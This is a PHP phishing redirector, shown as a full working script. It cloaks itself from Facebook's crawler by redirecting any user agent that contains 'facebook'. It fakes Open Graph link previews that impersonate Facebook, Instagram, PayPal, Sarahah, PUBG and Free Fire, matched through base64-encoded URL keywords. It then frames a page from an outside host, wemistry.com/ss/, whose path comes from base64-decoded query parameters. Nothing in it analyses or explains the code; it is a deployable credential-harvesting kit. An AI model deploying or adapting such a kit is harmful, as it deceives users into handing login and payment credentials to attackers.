<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
    <meta http-equiv="X-UA-Compatible" content="IE=9">

<?php
error_reporting(0);
$zebii = trim($_GET['url']);
$lax= trim($_GET['i']);
$Path = "https://wemistry.com/ss/";
$actual_link = "https://" . $_SERVER[ HTTP_HOST ] . $_SERVER[ REQUEST_URI ];
$ua = $_SERVER['HTTP_USER_AGENT'];
if (preg_match('/facebook/si',$ua)) { 
header('Location:https://web.facebook.com/'); 
die(); }else{
$zebiii = substr($zebii , strpos($zebii , '//'), 5000000 );
     	$find1 = strpos( $actual_link, "bW9iaWxlL2xvZ2lu" );   ///mobile/login
	$find2 = strpos( $actual_link, "aW5zdGFncmFt" );   ///instagram
	$find3 = strpos( $actual_link, "c2FyYW" );   ///saraha
	$find4 = strpos( $actual_link, "cGF5cGFs" );   ///paypal1
	$find5 = strpos( $actual_link, "c25hcA" );   ///snap
	$find6 = strpos( $actual_link, "cHV" );   ///pubg
	$find7 = strpos( $actual_link, "bWVzc2VuZ2Vy" );  ///messenger
	$find8 = strpos( $actual_link, "ZnJlZWZpcmU" );   ///freefire
	$find9 = strpos( $actual_link, "bW9iaWxlYXJhYmljL2xvZ2lu" );  ///mobilearabic/login
    $find10 = strpos( $actual_link, "bW9iaWxlZnJhbmNlL2xvZ2lu" );   ///mobilefrance/login

	echo '

 ';
	if ( $find1 || $find2 || $find3 || $find4 || $find5 || $find6 || $find7 || $find8 || $find9 || $find10 ) {
		echo '
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>';
	}
	if ( strpos($actual_link, 'mobile/login') !== false ) {
		echo '
<title></title>
<meta property="og:url" content="https://www.facebook.com" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Continue" />
<meta property="og:image" content="https://www.facebook.com" />
';
	} elseif( strpos($actual_link, 'instagram') !== false ) {
		echo '
<title></title>
<meta property="og:url" content="http://www.instagram.com" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Continue" />
<meta property="og:image" content="https://www.instagram.com/static/images/ico/apple-touch-icon-120x120-precomposed.png/02ba5abf9861.png" />
';
	}elseif( strpos( $actual_link, 'paypal1' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="https://www.paypal.com/" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Continue" />
<meta property="og:image" content="https://www.paypal.com" />
';
	}elseif( strpos( $actual_link, 'saraha' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="https://sarahah.com/" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Continue" />
<meta property="og:image" content="https://i.imgur.com/SRDa2BA.png" />
';
	}elseif( strpos( $actual_link, 'pubg' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="https://www.facebook.com" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Continue" />
<meta property="og:image" content="https://2014z520vw7j2q4i2nc4lbo5-wpengine.netdna-ssl.com/wp-content/uploads/2020/04/PUBG_STADIA_Vikendi_2-1365x768.png" />
';
	}elseif( strpos( $actual_link, 'paypal1' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="https://www.paypal.com/" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Continue" />
<meta property="og:image" content="https://www.paypal.com" />
';

	}elseif( strpos( $actual_link, 'mobilearabic/login' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="https://www.facebook.com" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Continue" />
<meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
';
	}elseif( strpos( $actual_link, 'mobilefrance/login' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="https://www.facebook.com" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Continue" />
<meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
';
	}elseif( strpos( $actual_link, 'messenger' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="https://www.facebook.com" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Continue" />
<meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
';
	}elseif( strpos( $actual_link, 'freefire' ) !== false ){
		echo '
<title></title>
<meta property="og:url" content="https://ff.garena.com/index.html" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Join Now" />
<meta property="og:description" content="Click Here To Continue" />
<meta property="og:image" content="http://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire32-2.ico" />
';
	}else{
		echo'
		';
	}

echo '
<html>
<title>Login into.......</title>
<link rel="shortcut icon" href="https://www.facebook.com/images/fb_icon_325x325.png" />
<head>
<frameset rows="*,4" frameborder="YES" border="50" framespacing="0">
<frame frameborder="0" src="'.$Path.base64_decode($zebiii.$lax).'" scrolling="yes" noresize="1" />
</head>
</html>';
} 
?>
